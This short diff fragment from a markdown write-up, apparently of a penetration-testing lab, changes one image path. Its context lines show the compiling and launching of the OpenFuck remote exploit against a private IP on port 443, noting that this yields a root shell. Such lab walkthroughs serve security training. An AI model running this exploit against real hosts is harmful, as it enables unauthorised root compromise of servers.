@@ -174,7 +174,7 @@ gcc -o OpenFuck OpenFuck.c -lcrypto
 ./OpenFuck 0x6b 192.168.1.104 443 -c 40
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 * You can see that we land as a root user
 
